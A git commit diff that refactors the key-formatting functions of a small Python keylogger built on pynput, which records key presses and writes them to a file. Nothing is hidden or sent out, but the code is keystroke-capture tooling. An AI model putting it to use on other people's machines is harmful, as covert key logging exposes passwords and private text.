675d43daae96895b98899a54a1bc42b78fd20690
Ben-Yeoh <ben.yeoh@outlook.com>
2021-03-27 01:10:16 +1100

    Add special key formatting to output

--- script.py
+++ script.py
@@ -1,4 +1,5 @@
 from pynput import keyboard
+import pynput
 
 keys = []
 
@@ -7,19 +8,29 @@ def strip_apostrophe(key):
     return str(key).replace("'", "")
 
 
-def format_key(key):
+def format_modifier_key(key):
     key = strip_apostrophe(key)
-    if (key == "Key.space"):
+    key = key.replace("Key.", "")
+    return f"[{key}]"
+
+
+def format_special_key(key):
+    if (key == keyboard.Key.space):
         return " "
-    elif (key == "Key.enter"):
+    elif (key == keyboard.Key.enter):
         return "\n"
-    elif (key == "Key.esc"):
+    elif (key == keyboard.Key.esc):
         return ""
-    # If the input is a modifier key (e.g. Shift, Alt)
+
+    # If the input is an invisible modifier key (e.g. Shift, Alt)
     # surrond it with brackets.
-    elif (len(key) > 1):
-        return f"[{key}]"
-    return key
+    return format_modifier_key(key)
+
+
+def format_key(key):
+    if (type(key) != pynput.keyboard.KeyCode):
+        return format_special_key(key)
+    return strip_apostrophe(key)
 
 
 def write_to_file(keys):
@@ -38,7 +49,6 @@ def on_press(key):
 
 def on_release(key):
     if key == keyboard.Key.esc:
-        # Stop listener
         return False
 
 
